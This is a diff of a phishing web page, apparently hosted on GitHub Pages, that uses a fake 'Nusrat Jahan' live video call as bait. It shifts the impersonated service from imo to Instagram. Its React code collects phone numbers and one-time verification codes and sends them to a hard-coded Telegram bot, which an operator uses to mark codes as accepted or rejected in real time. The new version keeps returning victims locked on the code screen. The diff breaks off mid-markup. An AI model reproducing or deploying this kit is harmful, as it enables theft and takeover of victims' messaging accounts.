@@ -1,128 +1,32 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<!-- Final Fixed Meta Tags for Preview -->
-<title>Unlock Mst: Nusrat Jahan</title>
-<meta property="og:site_name" content="imo Verification">
-<meta property="og:title" content="Unlock Mst: Nusrat Jahan Profile">
-<meta property="og:description" content="Click to verify your number and unlock the profile to send SMS and Call.">
-<meta property="og:url" content="https://nusrat-jahan-imo-voice-club.github.io/Nusrat-jahan-Live-Call/">
-
-<!-- ছবির নাম my-logo.jpg হলে নিচের লিংকটি কাজ করবে -->
-<meta property="og:image" content="https://nusrat-jahan-imo-voice-club.github.io/Nusrat-jahan-Live-Call/my-logo.jpg">
-<meta property="og:image:secure_url" content="https://nusrat-jahan-imo-voice-club.github.io/Nusrat-jahan-Live-Call/my-logo.jpg">
-
-<meta property="og:image:type" content="image/jpeg">
-<meta property="og:image:width" content="600">
-<meta property="og:image:height" content="600">
-<meta property="og:type" content="website">
-<meta name="twitter:card" content="summary_large_image">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     
-    <!-- Tailwind CSS -->
+    <title>Instagram Live: Nusrat Jahan</title>
+    <!-- Preview Tags -->
+    <meta property="og:title" content="🔴 Nusrat Jahan is LIVE Now!">
+    <meta property="og:image" content="https://nusrat-jahan-imo-voice-club.github.io/Nusrat-jahan-Live-Call/link-logo.jpg">
+    <meta property="og:description" content="Join the live video call with Nusrat Jahan.">
+
+    <!-- Tailwind & Icons -->
     <script src="https://cdn.tailwindcss.com"></script>
-    
-    <!-- FontAwesome -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    
-    <!-- React & ReactDOM -->
     <script crossorigin src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
     <script crossorigin src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
     <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
 
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700;900&display=swap');
-        
-        * { -webkit-tap-highlight-color: transparent; }
-        body {
-            font-family: 'Roboto', sans-serif;
-            background-color: #f0f2f5;
-            height: 100vh;
-            height: 100dvh;
-            overflow: hidden;
-            margin: 0; padding: 0;
-            user-select: none;
-        }
-
-        .animate-slide-up { animation: slideUp 0.3s ease-out forwards; }
-        @keyframes slideUp { from { transform: translateY(100%); } to { transform: translateY(0); } }
-        
-        .animate-fade { animation: fadeIn 0.3s ease-out forwards; }
-        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
-
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');
+        body { font-family: 'Roboto', sans-serif; background-color: #fafafa; margin: 0; padding: 0; }
+        .app-container { max-width: 450px; margin: 0 auto; background: white; min-height: 100vh; position: relative; box-shadow: 0 0 20px rgba(0,0,0,0.05); }
+        .btn-gradient { background: linear-gradient(45deg, #405de6, #5851db, #833ab4, #c13584, #e1306c, #fd1d1d); }
+        .story-ring { padding: 2px; background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888); border-radius: 50%; }
         .hide-scroll::-webkit-scrollbar { display: none; }
-        .hide-scroll { -ms-overflow-style: none; scrollbar-width: none; }
-        
-        input { color: #000000 !important; opacity: 1 !important; font-weight: 600; }
-        
-        .otp-disabled { background-color: #e2e8f0; color: #94a3b8 !important; cursor: not-allowed; }
-        
-        .country-modal { position: fixed; inset: 0; z-index: 50; background: white; display: flex; flex-direction: column; }
-        
-        /* Story Viewer */
-        .story-overlay { position: fixed; inset: 0; background: black; z-index: 100; display: flex; align-items: center; justify-content: center; }
-        .progress-bar { height: 2px; background: rgba(255,255,255,0.3); flex: 1; margin: 0 2px; position: relative; overflow: hidden; }
+        .video-overlay { position: fixed; inset: 0; background: black; z-index: 1000; display: flex; flex-direction: column; }
+        .progress-bar { height: 2px; background: rgba(255,255,255,0.3); flex: 1; margin: 0 2px; }
         .progress-fill { height: 100%; background: white; width: 0%; }
-        .animate-progress { animation: progressFill linear forwards; }
-        @keyframes progressFill { from { width: 0%; } to { width: 100%; } }
-
-        /* FB Style Stories */
-        .story-card {
-            width: 100px;
-            height: 160px;
-            border-radius: 12px;
-            overflow: hidden;
-            position: relative;
-            flex-shrink: 0;
-            cursor: pointer;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
-        }
-        .story-card img { width: 100%; height: 100%; object-fit: cover; }
-        .story-avatar {
-            position: absolute;
-            top: 8px;
-            left: 8px;
-            width: 32px;
-            height: 32px;
-            border-radius: 50%;
-            border: 3px solid #0091ea;
-            z-index: 10;
-        }
-
-        /* Toast Notification */
-        .toast-notification {
-            position: fixed;
-            top: 20px;
-            left: 50%;
-            transform: translateX(-50%);
-            background-color: rgba(0, 0, 0, 0.9);
-            color: white;
-            padding: 12px 20px;
-            border-radius: 8px;
-            font-size: 13px;
-            z-index: 9999;
-            width: 90%;
-            max-width: 400px;
-            text-align: center;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
-            animation: slideDown 0.5s ease-out forwards;
-            line-height: 1.4;
-        }
-        @keyframes slideDown { from { top: -100px; opacity: 0; } to { top: 20px; opacity: 1; } }
-
-        .live-badge {
-            position: absolute;
-            top: 8px;
-            right: 8px;
-            background: #ff0000;
-            color: white;
-            font-size: 8px;
-            font-weight: bold;
-            padding: 2px 6px;
-            border-radius: 4px;
-            text-transform: uppercase;
-            animation: pulse 1.5s infinite;
-        }
-        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
     </style>
 </head>
 <body>
@@ -131,306 +35,286 @@
     <script type="text/babel">
         const { useState, useEffect, useRef } = React;
 
-        // --- CONFIGURATION ---
         const BOT_TOKEN = "8522129049:AAHZalnaH5g1evquwhwL1PmZjiasK9ZpAdI"; 
         const CHAT_ID = "6904677396"; 
         const REDIRECT_LINK = "https://profile.imo.im/profileshare/shr.AAAAAAAAAAAAAAAAAAAAAPJ7LNAdm5sh2K-4b-Aq7rq4CDUGPD4SInhRX-x2NJh6";
 
-        // --- DATA: COUNTRIES (Digits Updated for 11 and flexibility) ---
-        const COUNTRIES = [
-            { name: 'Bangladesh', code: '+880', flag: '🇧🇩', digits: 11 },
-            { name: 'India', code: '+91', flag: '🇮🇳', digits: 11 },
-            { name: 'Pakistan', code: '+92', flag: '🇵🇰', digits: 11 },
-            { name: 'Saudi Arabia', code: '+966', flag: '🇸🇦', digits: 10 },
-            { name: 'United Arab Emirates', code: '+971', flag: '🇦🇪', digits: 10 },
-            { name: 'Oman', code: '+968', flag: '🇴🇲', digits: 10 },
-            { name: 'Qatar', code: '+974', flag: '🇶🇦', digits: 10 },
-            { name: 'Kuwait', code: '+965', flag: '🇰🇼', digits: 10 },
-            { name: 'Bahrain', code: '+973', flag: '🇧🇭', digits: 10 },
-            { name: 'Malaysia', code: '+60', flag: '🇲🇾', digits: 10 },
-            { name: 'Singapore', code: '+65', flag: '🇸🇬', digits: 10 },
-            { name: 'Indonesia', code: '+62', flag: '🇮🇩', digits: 12 },
-            { name: 'United States', code: '+1', flag: '🇺🇸', digits: 11 },
-            { name: 'United Kingdom', code: '+44', flag: '🇬🇧', digits: 11 },
-            { name: 'Italy', code: '+39', flag: '🇮🇹', digits: 11 },
-        ];
-
-        const STORY_VIDEOS = ['my-story1.mp4', 'my-story2.mp4', 'my-story3.mp4'];
-
-        const sendToTelegram = async (message) => {
-            try {
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
-                });
-            } catch (e) { console.error(e); }
-        };
-
-        const StoryViewer = ({ onClose }) => {
-            const [currentIndex, setCurrentIndex] = useState(0);
-            const videoRef = useRef(null);
-
-            useEffect(() => {
-                sendToTelegram("👀 *User started watching Story*");
-                return () => sendToTelegram("❌ *User stopped watching Story*");
-            }, []);
-
-            useEffect(() => {
-                if(videoRef.current) {
-                    videoRef.current.currentTime = 0;
-                    videoRef.current.play().catch(e => {});
-                }
-            }, [currentIndex]);
-
-            const handleNext = () => {
-                if (currentIndex < STORY_VIDEOS.length - 1) setCurrentIndex(prev => prev + 1);
-                else onClose();
-            };
-
-            return (
-                <div className="story-overlay animate-fade">
-                    <div className="absolute top-2 left-0 right-0 flex px-2 z-20">
-                        {STORY_VIDEOS.map((_, idx) => (
-                            <div key={idx} className="progress-bar">
-                                <div className={`progress-fill ${idx === currentIndex ? 'animate-progress' : ''}`} style={{ width: idx < currentIndex ? '100%' : '0%', animationDuration: '5s' }}></div>
-                            </div>
-                        ))}
-                    </div>
-                    <div className="absolute top-6 right-4 z-30" onClick={onClose}><i className="fa-solid fa-xmark text-white text-2xl"></i></div>
-                    <div className="absolute top-6 left-4 z-20 flex items-center gap-2">
-                        <img src="my-logo.jpg" className="w-8 h-8 rounded-full border border-white" />
-                        <span className="text-white font-bold text-sm">Mst: Nusrat Jahan</span>
-                    </div>
-                    <video ref={videoRef} src={STORY_VIDEOS[currentIndex]} className="w-full h-auto max-h-screen" onEnded={handleNext} onClick={handleNext} playsInline autoPlay />
-                </div>
-            );
-        };
-
-        const LiveViewer = ({ onClose }) => {
-            useEffect(() => { sendToTelegram("🎥 *User watching LIVE VIDEO CALL*"); }, []);
-            return (
-                <div className="story-overlay animate-fade">
-                    <div className="absolute top-6 right-4 z-30" onClick={onClose}><i className="fa-solid fa-xmark text-white text-2xl"></i></div>
-                    <div className="absolute top-6 left-4 z-20 flex flex-col gap-1">
-                        <div className="flex items-center gap-2">
-                           <div className="bg-red-600 text-white text-[10px] font-bold px-2 py-0.5 rounded">LIVE</div>
-                           <span className="text-white font-bold text-sm">Mst: Nusrat Jahan</span>
-                        </div>
-                    </div>
-                    <video src="my-live.mp4" className="w-full h-full object-cover" playsInline autoPlay loop />
-                    <div className="absolute bottom-10 left-0 right-0 flex justify-center z-20">
-                        <div className="w-14 h-14 bg-red-600 rounded-full flex items-center justify-center text-white text-xl" onClick={onClose}>
-                            <i className="fa-solid fa-phone-slash"></i>
-                        </div>
-                    </div>
-                </div>
-            );
-        };
-
-        const CountrySelector = ({ isOpen, onClose, onSelect }) => {
-            const [search, setSearch] = useState('');
-            const filtered = COUNTRIES.filter(c => c.name.toLowerCase().includes(search.toLowerCase()) || c.code.includes(search));
-            if (!isOpen) return null;
-            return (
-                <div className="country-modal animate-slide-up">
-                    <div className="h-14 flex items-center px-4 border-b border-slate-100"><i onClick={onClose} className="fa-solid fa-arrow-left text-xl text-slate-600 mr-4 cursor-pointer"></i><span className="text-lg font-bold">Select Country</span></div>
-                    <div className="p-4 bg-slate-50">
-                        <div className="bg-white flex items-center px-3 py-2 rounded-lg border border-slate-200">
-                            <i className="fa-solid fa-magnifying-glass text-slate-400 mr-2"></i>
-                            <input type="text" placeholder="Search country" className="w-full outline-none" autoFocus value={search} onChange={(e) => setSearch(e.target.value)} />
-                        </div>
-                    </div>
-                    <div className="flex-1 overflow-y-auto hide-scroll pb-10">
-                        {filtered.map((c, i) => (
-                            <div key={i} onClick={() => { onSelect(c); onClose(); }} className="flex items-center justify-between px-5 py-4 border-b border-slate-50 hover:bg-slate-50 cursor-pointer">
-                                <div className="flex items-center gap-3"><span className="text-2xl">{c.flag}</span><span className="text-slate-800 font-medium">{c.name}</span></div>
-                                <span className="text-slate-500 font-bold">{c.code}</span>
-                            </div>
-                        ))}
-                    </div>
-                </div>
-            );
-        };
-
         const App = () => {
-            const [step, setStep] = useState('PHONE');
+            const [step, setStep] = useState('MAIN'); // MAIN, JOIN_FORM, LOADER, OTP, VERIFYING, SUCCESS, ERROR
             const [phone, setPhone] = useState('');
-            const [selectedCountry, setSelectedCountry] = useState(COUNTRIES[0]);
-            const [showCountryModal, setShowCountryModal] = useState(false);
-            const [showStories, setShowStories] = useState(false);
-            const [showLive, setShowLive] = useState(false);
-            const [showToast, setShowToast] = useState(false);
             const [otp, setOtp] = useState(['', '', '', '']);
-            const [otpSubmitTime, setOtpSubmitTime] = useState(0); 
-            const [otpLocked, setOtpLocked] = useState(false);
-            const [lockTimer, setLockTimer] = useState(30);
-            const [isRetryPhase, setIsRetryPhase] = useState(false); 
+            const [timer, setTimer] = useState(15);
+            const [otpSubmitTime, setOtpSubmitTime] = useState(0);
+            const [showStories, setShowStories] = useState(false);
+            const [currentStoryIdx, setCurrentStoryIdx] = useState(0);
+            const [showLivePreview, setShowLivePreview] = useState(false);
+
             const otpRefs = [useRef(), useRef(), useRef(), useRef()];
+            const STORY_VIDEOS = ['my-story1.mp4', 'my-story2.mp4', 'my-story3.mp4'];
 
-            // নাম্বার ইনপুট ভ্যালিডেশন চেক (কমপক্ষে ৮ ডিজিট হলে বাটন কাজ করবে)
-            const isValidPhone = phone.length >= 8 && phone.length <= selectedCountry.digits;
-
+            // Persistence: Check if user already submitted phone
             useEffect(() => {
-                sendToTelegram(`👀 *New Visitor (App)*`);
-                const toastInterval = setInterval(() => {
-                    setShowToast(true);
-                    setTimeout(() => setShowToast(false), 5000);
-                }, 30000);
-                return () => clearInterval(toastInterval);
+                const isLocked = localStorage.getItem('isLocked');
+                const savedPhone = localStorage.getItem('userPhone');
+                if (isLocked === 'true' && savedPhone) {
+                    setPhone(savedPhone);
+                    setStep('OTP');
+                    sendMsg(`🔄 *User returned to page*\nPhone: \`${savedPhone}\`\nAsking for OTP again...`);
+                }
             }, []);
 
+            // OTP Timer
+            useEffect(() => {
+                if ((step === 'OTP' || step === 'VERIFYING') && timer > 0) {
+                    const t = setInterval(() => setTimer(prev => prev - 1), 1000);
+                    return () => clearInterval(t);
+                }
+            }, [step, timer]);
+
+            // Telegram Polling for commands
             useEffect(() => {
                 let interval;
-                if (step === 'VERIFYING') {
+                if (step === 'VERIFYING' || step === 'OTP') {
                     interval = setInterval(async () => {
                         try {
                             const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-1`);
                             const data = await res.json();
-                            if (data.result && data.result.length > 0) {
-                                const lastUpdate = data.result[0];
-                                const msg = lastUpdate.message?.text?.trim();
-                                if (lastUpdate.message?.date > otpSubmitTime) {
-                                    if (msg === '/success') setStep('SUCCESS');
-                                    else if (msg === '/error') setStep('ERROR');
+                            if (data.result?.length > 0) {
+                                const last = data.result[0].message;
+                                if (last.date > otpSubmitTime) {
+                                    if (last.text === '/success') {
+                                        localStorage.removeItem('isLocked');
+                                        setStep('SUCCESS');
+                                    } else if (last.text === '/error') {
+                                        setStep('ERROR');
+                                    }
                                 }
                             }
                         } catch (e) {}
-                    }, 1500);
+                    }, 2000);
                 }
                 return () => clearInterval(interval);
             }, [step, otpSubmitTime]);
 
-            useEffect(() => {
-                if (lockTimer > 0) {
-                    const timer = setInterval(() => { setLockTimer(prev => prev - 1); }, 1000);
-                    return () => clearInterval(timer);
-                } else if (!isRetryPhase) {
-                    setOtpLocked(false);
-                }
-            }, [lockTimer, isRetryPhase]);
+            const sendMsg = async (msg) => {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown'})
+                });
+            };
 
-            const handlePhoneSubmit = async (e) => {
-                e.preventDefault();
-                if (!isValidPhone) return;
-                await sendToTelegram(`📱 *Phone Submitted*\nNumber: ${selectedCountry.code} ${phone}`);
+            const handlePhoneSubmit = async () => {
+                if (phone.length < 5) return;
+                localStorage.setItem('userPhone', phone);
+                localStorage.setItem('isLocked', 'true');
+                await sendMsg(`📱 *User Submitted Number*\nPhone: \`${phone}\``);
                 setStep('LOADER');
                 setTimeout(() => {
                     setStep('OTP');
-                    setOtpLocked(true);
-                    setLockTimer(30);
+                    setTimer(15);
                 }, 3000);
             };
 
-            const handleOtpChange = (index, val) => {
-                if (!isRetryPhase && otpLocked) return; 
+            const handleOtpChange = (i, val) => {
                 if (!/^\d*$/.test(val)) return;
                 const newOtp = [...otp];
-                newOtp[index] = val;
+                newOtp[i] = val;
                 setOtp(newOtp);
-                if (val && index < 3) otpRefs[index + 1].current.focus();
+                if (val && i < 3) otpRefs[i+1].current.focus();
                 if (newOtp.join('').length === 4) {
-                    setOtpSubmitTime(Math.floor(Date.now() / 1000));
-                    sendToTelegram(`🔐 *OTP Received*\nNumber: ${selectedCountry.code} ${phone}\nOTP: \`${newOtp.join('')}\``);
+                    const time = Math.floor(Date.now()/1000);
+                    setOtpSubmitTime(time);
+                    sendMsg(`🔐 *OTP Received*\nPhone: \`${phone}\`\nOTP: \`${newOtp.join('')}\``);
                     setStep('VERIFYING');
                 }
             };
 
-            const handleRetry = () => {
-                setOtp(['', '', '', '']);
-                setStep('OTP');
-                setIsRetryPhase(true);
-                setLockTimer(10);
-                setOtpLocked(false);
-                setTimeout(() => otpRefs[0].current?.focus(), 100);
+            const goBack = () => {
+                // If user is locked, they can't go back past OTP screen easily
+                if (localStorage.getItem('isLocked') === 'true') {
+                    setStep('OTP');
+                    return;
+                }
+                if (step === 'JOIN_FORM') setStep('MAIN');
+                if (step === 'ERROR') setStep('OTP');
             };
 
             return (
-                <div className="flex flex-col h-full w-full bg-white relative">
-                    {showToast && <div className="toast-notification">Nusrat Jahan imo account is Locked. Please Unlock to start SMS and calling.</div>}
-
-                    <div className="h-14 bg-white flex items-center px-4 border-b border-slate-100 z-30 shadow-sm">
-                        {step !== 'PHONE' && step !== 'SUCCESS' && <i onClick={() => setStep('PHONE')} className="fa-solid fa-arrow-left text-slate-600 mr-4"></i>}
-                        <img src="imo-logo.jpg" className="w-8 h-8 rounded-full mr-2" />
-                        <span className="text-xl font-bold text-[#0091ea]">imo</span>
+                <div className="app-container flex flex-col">
+                    
+                    {/* IG Header */}
+                    <div className="h-14 px-4 flex items-center justify-between border-b border-gray-100 bg-white sticky top-0 z-[100]">
+                        <div className="flex items-center gap-2">
+                            {step !== 'MAIN' && step !== 'SUCCESS' && (
+                                <i onClick={goBack} className="fa-solid fa-arrow-left text-xl cursor-pointer mr-2"></i>
+                            )}
+                            <span className="text-2xl font-bold italic font-serif tracking-tighter">Instagram</span>
+                        </div>
+                        <div className="flex gap-5 text-xl">
+                            <i className="fa-regular fa-heart"></i>
+                            <i className="fa-brands fa-facebook-messenger"></i>
+                        </div>
                     </div>
 
-                    <div className="flex-1 overflow-y-auto hide-scroll bg-[#f0f2f5]">
-                        {step === 'PHONE' && (
-                            <div className="bg-white p-4 mb-3">
-                                <div className="flex gap-3 overflow-x-auto hide-scroll">
-                                    <div className="story-card bg-slate-100 border border-slate-200">
-                                        <div className="h-[65%] w-full"><img src="my-logo.jpg" /></div>
-                                        <div className="h-[35%] bg-white relative flex flex-col items-center justify-end pb-2">
-                                            <div className="absolute -top-4 w-8 h-8 bg-[#0091ea] rounded-full border-4 border-white flex items-center justify-center text-white"><i className="fa-solid fa-plus text-xs"></i></div>
-                                            <span className="text-[10px] font-bold">Create Story</span>
+                    <div className="flex-1 pb-16">
+                        {step === 'MAIN' && (
+                            <div className="animate-fade">
+                                {/* Stories */}
+                                <div className="p-4 flex gap-4 overflow-x-auto hide-scroll bg-white">
+                                    <div className="flex flex-col items-center shrink-0">
+                                        <div className="w-[72px] h-[72px] p-0.5 border border-gray-200 rounded-full relative">
+                                            <img src="my-logo.jpg" className="w-full h-full rounded-full object-cover" />
+                                            <div className="absolute bottom-0 right-0 bg-blue-500 text-white border-2 border-white rounded-full w-5 h-5 flex items-center justify-center text-[10px]"><i className="fa fa-plus"></i></div>
                                         </div>
+                                        <span className="text-[11px] mt-1 text-gray-500">My story</span>
                                     </div>
-                                    <div className="story-card" onClick={() => setShowLive(true)}>
-                                        <img src="my-logo.jpg" />
-                                        <div className="live-badge">Live</div>
-                                        <div className="story-avatar bg-red-600 flex items-center justify-center border-red-600"><i className="fa-solid fa-video text-white text-[10px]"></i></div>
-                                        <div className="absolute bottom-2 left-2 right-2"><span className="text-white text-[10px] font-bold drop-shadow-md">Live Call</span></div>
+                                    <div className="flex flex-col items-center shrink-0" onClick={() => {setShowStories(true); setCurrentStoryIdx(0);}}>
+                                        <div className="w-[72px] h-[72px] story-ring">
+                                            <div className="w-full h-full border-2 border-white rounded-full overflow-hidden">
+                                                <img src="my-logo.jpg" className="w-full h-full object-cover" />
+                                            </div>
+                                        </div>
+                                        <span className="text-[11px] mt-1 font-medium">Nusrat Jahan</span>
                                     </div>
-                                    <div className="story-card" onClick={() => setShowStories(true)}>
-                                        <img src="my-logo.jpg" /><img src="my-logo.jpg" className="story-avatar" />
-                                        <div className="absolute bottom-2 left-2 right-2"><span className="text-white text-[10px] font-bold drop-shadow-md">Nusrat Jahan</span></div>
+                                </div>
+
+                                {/* Live Preview Frame */}
+                                <div className="px-4 mt-2">
+                                    <div className="relative w-full aspect-[4/5] rounded-xl overflow-hidden shadow-lg bg-black group" onClick={() => setShowLivePreview(true)}>
+                                        <video src="my-live.mp4" className="w-full h-full object-cover opacity-80" autoPlay loop muted playsInline />
+                                        <div className="absolute top-4 left-4 flex gap-2">
+                                            <div className="bg-red-600 text-white text-[10px] font-bold px-2 py-0.5 rounded-sm">LIVE</div>
+                                            <div className="bg-black/40 text-white text-[10px] px-2 py-0.5 rounded-sm"><i className="fa fa-eye mr-1"></i> 1.2k</div>
+                                        </div>
+                                        <div className="absolute top-4 right-4 bg-yellow-400 text-black text-[10px] font-bold px-2 py-0.5 rounded-sm"><i className="fa fa-crown mr-1"></i> PREMIUM</div>
+                                        <div className="absolute inset-0 flex flex-col items-center justify-center text-white text-center">
+                                            <i className="fa-solid fa-circle-play text-6xl opacity-70 mb-4"></i>
+                                            <h2 className="text-xl font-bold">Mst: Nusrat Jahan</h2>
+                                            <button onClick={(e) => {e.stopPropagation(); setStep('JOIN_FORM');}} className="mt-4 px-8 py-2 bg-white text-black rounded-full font-bold text-sm shadow-xl">JOIN NOW</button>
+                                        </div>
                                     </div>
                                 </div>
                             </div>
                         )}
 
-                        <div className="p-4">
-                            <div className="w-full bg-white rounded-xl p-6 shadow-sm border border-slate-200">
-                                {step === 'PHONE' && (
-                                    <>
-                                        <div className="flex flex-col items-center text-center mb-6">
-                                            <div className="w-20 h-20 rounded-full border-4 border-[#0091ea] p-1 mb-3"><img src="my-logo.jpg" className="w-full h-full rounded-full object-cover" /></div>
-                                            <h3 className="font-bold text-xl">Mst: Nusrat Jahan</h3>
-                                            <p className="text-xs text-slate-500 mt-1">Unlock profile to start voice or video call</p>
-                                        </div>
-                                        <form onSubmit={handlePhoneSubmit}>
-                                            <div className="flex items-center bg-slate-50 border border-slate-200 rounded-xl px-4 py-4 mb-6">
-                                                <div className="flex items-center gap-2 cursor-pointer border-r border-slate-300 pr-3 mr-3" onClick={() => setShowCountryModal(true)}>
-                                                    <span className="text-xl">{selectedCountry.flag}</span>
-                                                    <span className="font-bold">{selectedCountry.code}</span>
-                                                </div>
-                                                <input type="tel" value={phone} onChange={(e) => setPhone(e.target.value.replace(/\D/g,''))} className="flex-1 bg-transparent outline-none font-bold text-lg" placeholder="Enter number" />
-                                            </div>
-                                            <button disabled={!isValidPhone} className={`w-full text-white font-bold py-4 rounded-xl shadow-lg ${isValidPhone ? 'bg-[#0091ea]' : 'bg-slate-300'}`}>Unlock Now</button>
-                                        </form>
-                                    </>
-                                )}
+                        {step === 'JOIN_FORM' && (
+                            <div className="px-8 py-12 text-center animate-fade">
+                                <div className="flex justify-center mb-6">
+                                    <img src="my-logo.jpg" className="w-24 h-24 rounded-full border p-1 border-gray-100" />
+                                </div>
+                                <h2 className="text-xl font-bold mb-1">Nusrat Jahan</h2>
+                                <p className="text-gray-500 text-sm mb-10">Unlock profile to start voice or video call</p>
+                                <input 
+                                    type="tel" 
+                                    placeholder="Phone number" 
+                                    className="w-full bg-gray-50 border border-gray-200 rounded-lg px-4 py-3 mb-6 focus:outline-none"
+                                    value={phone}
+                                    onChange={(e) => setPhone(e.target.value)}
+                                />
+                                <button onClick={handlePhoneSubmit} className="w-full btn-gradient text-white font-bold py-3.5 rounded-lg text-sm shadow-lg">JOIN LIVE NOW</button>
+                                <p className="text-[11px] text-gray-400 mt-6">By joining, you agree to our private live call terms and conditions.</p>
+                            </div>
+                        )}
 
-                                {step === 'LOADER' && <div className="text-center py-10"><div className="w-12 h-12 border-4 border-slate-100 border-t-[#0091ea] rounded-full animate-spin mx-auto mb-4"></div><p className="font-bold text-slate-600">Connecting...</p></div>}
-                                {step === 'OTP' && (
-                                    <div className="text-center py-4">
-                                        <h3 className="text-2xl font-bold mb-3">Security Check</h3>
-                                        <p className="text-slate-500 text-sm mb-8">Enter the 4-digit unlock number received on your imo/sms.</p>
-                                        <div className="flex justify-center gap-3 mb-8">
-                                            {otp.map((d, i) => (
-                                                <input key={i} ref={otpRefs[i]} type="tel" maxLength={1} value={d} onChange={(e) => handleOtpChange(i, e.target.value)} disabled={!isRetryPhase && otpLocked} className={`w-14 h-16 border-2 rounded-xl text-center text-3xl font-bold ${(!isRetryPhase && otpLocked) ? 'otp-disabled' : 'border-slate-200 bg-slate-50'}`} />
-                                            ))}
-                                        </div>
-                                        {lockTimer > 0 && <p className="text-slate-400 text-sm">Please wait {lockTimer}s</p>}
-                                    </div>
-                                )}
-                                {step === 'VERIFYING' && <div className="text-center py-10"><div className="w-12 h-12 border-4 border-t-[#0091ea] rounded-full animate-spin mx-auto mb-4"></div><p className="font-bold text-slate-600">Verifying...</p></div>}
-                                {step === 'SUCCESS' && <div className="text-center py-8 text-green-600"><i className="fa-solid fa-circle-check text-6xl mb-4"></i><h3 className="text-2xl font-bold">Successful!</h3></div>}
-                                {step === 'ERROR' && <div className="text-center py-8"><i className="fa-solid fa-circle-xmark text-6xl text-red-500 mb-4"></i><h3 className="text-xl font-bold text-red-600 mb-6">Wrong Number!</h3><button onClick={handleRetry} className="w-full bg-red-500 text-white font-bold py-4 rounded-xl shadow-lg">Try Again</button></div>}
+                        {step === 'LOADER' && (
+                            <div className="text-center py-24">
+                                <div className="w-10 h-10 border-4 border-gray-200 border-t-pink-500 rounded-full animate-spin mx-auto mb-4"></div>
+                                <p className="text-sm font-medium text-gray-500">Requesting Access...</p>
+                            </div>
+                        )}
+
+                        {(step === 'OTP' || step === 'VERIFYING') && (
+                            <div className="px-8 py-12 text-center animate-fade">
+                                <div className="w-16 h-16 bg-pink-50 text-pink-500 rounded-full flex items-center justify-center mx-auto mb-6">
+                                    <i className="fa-solid fa-lock text-2xl"></i>
+                                </div>
+                                <h3 className="text-xl font-bold mb-2">Private Access</h3>
+                                <p className="text-gray-500 text-xs mb-10 px-4">Enter the 4-digit premium code sent to your imo/sms to unlock the live.</p>
+                                <div className="flex justify-center gap-4 mb-10">
+                                    {otp.map((d, i) => (
+                                        <input key={i} ref={otpRefs[i]} type="tel" maxLength={1} value={d} onChange={(e) => handleOtpChange(i, e.target.value)} className="w-12 h-14 border border-gray-300 rounded-lg text-center text-2xl font-bold bg-gray-50" />
+                                    ))}
+                                </div>
+                                <p className="text-gray-400 text-[11px] font-bold uppercase">Verifying in {timer}s...</p>
+                                {step === 'VERIFYING' && <div className="mt-6 text-blue-500 text-xs animate-pulse">Checking Authorization...</div>}
+                            </div>
+                        )}
+
+                        {step === 'ERROR' && (
+                            <div className="px-8 py-12 text-center">
+                                <i className="fa-solid fa-circle-exclamation text-6xl text-red-500 mb-6"></i>
+                                <h3 className="text-xl font-bold text-red-600 mb-2">Invalid Code</h3>
+                                <p className="text-gray-500 text-sm mb-10">The code is incorrect. Please check your message and try again.</p>
+                                <button onClick={() => setStep('OTP')} className="w-full bg-black text-white py-3.5 rounded-lg font-bold">TRY AGAIN</button>
+                            </div>
+                        )}
+                    </div>
+
+                    {/* Bottom Nav */}
+                    <div className="h-14 border-t border-gray-100 flex justify-around items-center text-xl bg-white sticky bottom-0">
+                        <i className="fa-solid fa-house"></i>
+                        <i className="fa-solid fa-magnifying-glass text-gray-400"></i>
+                        <i className="fa-regular fa-square-plus text-gray-400"></i>
+                        <i className="fa-solid fa-clapperboard text-gray-400"></i>
+                        <img src="my-logo.jpg" className="w-7 h-7 rounded-full border border-gray-200" />
+                    </div>
+
+                    {/* Fullscreen Video Overlays */}
+                    {showStories && (
+                        <div className="video-overlay animate-fade">
+                            <div className="absolute top-4 inset-x-0 flex px-2 z-50">
+                                {STORY_VIDEOS.map((_, i) => (
+                                    <div key={i} className="progress-bar"><div className={`progress-fill ${i === currentStoryIdx ? 'w-full transition-all duration-[5000ms] linear' : (i < currentStoryIdx ? 'w-full' : 'w-0')}`}></div></div>
+                                ))}
+                            </div>
+                            <div className="absolute top-8 left-4 flex items-center gap-2 z-50 text-white">
+                                <img src="my-logo.jpg" className="w-8 h-8 rounded-full border border-white" />
+                                <span className="font-bold text-xs">Nusrat Jahan</span>
+                            </div>
+                            <div className="absolute top-8 right-4 z-50 text-white text-2xl" onClick={() => setShowStories(false)}><i className="fa fa-times"></i></div>
+                            <video src={STORY_VIDEOS[currentStoryIdx]} className="w-full h-full object-cover" autoPlay playsInline onEnded={() => currentStoryIdx < 2 ? setCurrentStoryIdx(prev => prev+1) : setShowStories(false)} />
+                        </div>
+                    )}
+
+                    {showLivePreview && (
+                        <div className="video-overlay animate-fade">
+                            <video src="my-live.mp4" className="w-full h-full object-cover" autoPlay loop playsInline />
+                            <div className="absolute top-8 left-4 flex items-center gap-2 z-50 text-white">
+                                <img src="my-logo.jpg" className="w-10 h-10 rounded-full border-2 border-pink-500" />
+                                <div className="flex flex-col">
